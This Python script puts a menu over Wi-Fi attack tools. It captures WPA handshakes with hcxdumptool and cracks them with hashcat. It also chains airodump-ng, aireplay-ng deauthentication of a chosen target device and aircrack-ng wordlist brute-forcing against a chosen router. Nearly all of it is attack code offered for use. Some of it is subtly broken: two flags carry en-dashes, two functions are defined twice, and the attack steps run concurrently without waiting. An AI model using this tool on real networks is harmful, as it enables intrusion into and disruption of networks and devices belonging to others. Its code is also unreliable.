import subprocess

logo = '''
              j#################Wt                
         .############################            
        ################################          
       ##################################         
       ##################################         
      f##################################         
      ###################################j        
      ####################################        
      ####################################        
      ####################################        
      ####################################        
     :####################################        
     f####################################        
     W#####      #############E     ;#####        
     ####          #########D         G###j       
     ###,#######    f######    f#####Et           
     #############:  ##L                          
     ###D; 
     -------------------------------------------
    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █ ▄▀▄ █ ████▀ ██ ▄▄ █▀▄▀█ ██ █ ▄▄▀█ ▄▄█ ▄▄▀
    █ █▄█ █ ▄▄ ██ ████▄▀█ █▀█ ▀▀ █ ▄▄▀█ ▄▄█ ▀▀▄
    █▄███▄█▄██▄█▀ ▀█ ▀▀ ██▄██▀▀▀▄█▄▄▄▄█▄▄▄█▄█▄▄
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
    --------------------------------------------
     :L###Ej    
                         iE###WL.      :fK#       
           G####KL,      :tE###############       
  .D;      :iG############################t       
      ####################################        
      ###################################i        
      :#################################DW        
      # :############################## tL        
      E#      ####################    ; #         
       # #  ########################  E #         
       #:j: j#####E#,#####ft#L#####i L D#         
       ## #  W######  G##. .######L  # #G         
        # #W  f#####W      ######i  #D,#          
        ## #;   ###i        f##K   L# ##          
        .# ##          G:         :#KL#           
         ## ##L       :##        D## ##           
         .#j######D: D####j ,D#####KK#            
          ## ###################### #G            
           ##G####################;##             
           :########################              
            #######################K              
             #########    #########               
              ########   t########                
              f#######    #######;                
               ######D    ######K                 
                #####j    ######                  
                 ####W    #####                   

'''
print(logo)
def stop_services():
    subprocess.run(["sudo", "systemctl", "stop", "NetworkManager.service"])
    subprocess.run(["sudo", "systemctl", "stop", "wpa_supplicant.service"])
    print(logo)

def start_services():
    subprocess.run(["sudo", "systemctl", "start", "wpa_supplicant.service"])
    subprocess.run(["sudo", "systemctl", "start", "NetworkManager.service"])
    print(logo)

def run_hcxdumptool(interface, dumpfile):
    subprocess.run(["sudo", "hcxdumptool", "-i", interface, "-o", dumpfile, "–active_beacon", "–enable_status=15"])

def run_hcxpcapngtool(input_file, output_file, wordlist):
    subprocess.run(["hcxpcapngtool", "-o", output_file, "-E", "essidlist", input_file])
    subprocess.run(["hashcat", "-m", "22000", output_file, wordlist])

def run_airodump_ng(interface, router_channel, target_router, fname, target_device, wordlist):
    # Step 1: Start monitor mode
    subprocess.run(["airmon-ng", "start", interface])
    # Step 2: Start airodump-ng to capture all APs and clients
    subprocess.Popen(["airodump-ng", interface])
    # Step 3: Start airodump-ng to capture traffic for target router
    subprocess.Popen(["airodump-ng", "-c", router_channel, "--bssid", target_router, "-w", fname,interface])
    # Step 4: Send deauth packets to target device to capture handshake
    subprocess.Popen(["aireplay-ng", "-0", "1", "-a", target_router, "-c", target_device, interface])
    # Step 5: Use aircrack-ng to brute-force the password using a wordlist
    subprocess.Popen(["aircrack-ng", "-w", wordlist, "-b", target_router, fname + ".cap", "-e", target_router])

def run_airodump_ng_simple(interface):
    subprocess.run(["airodump-ng", interface])



def hcxdumptool_menu():
    interface = input("Enter the interface: ")
    dumpfile = input("Enter the name of the dump file: ")
    stop_services()
    run_hcxdumptool(interface, dumpfile)
    start_services()

def hcxpcapngtool_menu():
    input_file = input("Enter the name of the input file: ")
    output_file = input("Enter the name of the output file: ")
    wordlist = input("Enter the name of the wordlist: ")
    run_hcxpcapngtool(input_file, output_file, wordlist)

def airodump_ng_menu():
    interface = input("Enter the interface: ")
    router_channel = input("Enter the channel of the target router: ")
    target_router = input("Enter the BSSID of the target router: ")
    fname = input("Enter the name for the output capture file: ")
    target_device = input("Enter the MAC address of the target device: ")
    wordlist = input("Enter the name of the wordlist: ")
    stop_services()
    run_airodump_ng(interface, router_channel, target_router, fname, target_device, wordlist)
    start_services()

def airodump_ng_simple_menu():
	interface = input("Enter the interface: ")
	run_airodump_ng_simple(interface)

def main_menu():
	print("1. Run hcxdumptool")
	print("2. Run hcxpcapngtool")
	print("3. Run airodump-ng (advanced)")
	print("4. Run airodump-ng (simple)")
	print("5. Quit")
	option = input("Enter your option: ")
	return option

def hcxdumptool_menu():
	interface = input("Enter the interface: ")
	dumpfile = input("Enter the name of the dump file: ")
	stop_services()
	run_hcxdumptool(interface, dumpfile)
	start_services()

def hcxpcapngtool_menu():
	input_file = input("Enter the name of the input file: ")
	output_file = input("Enter the name of the output file: ")
	wordlist = input("Enter the name of the wordlist: ")
	run_hcxpcapngtool(input_file, output_file, wordlist)

def main():
  while True:
    option = main_menu()
    if option == "1":
      hcxdumptool_menu()
    elif option == "2":
      hcxpcapngtool_menu()
    elif option == "3":
      airodump_ng_menu()
    elif option == "4":
      airodump_ng_simple_menu()
    elif option == "5":
      break

if __name__ == "__main__":
  main()





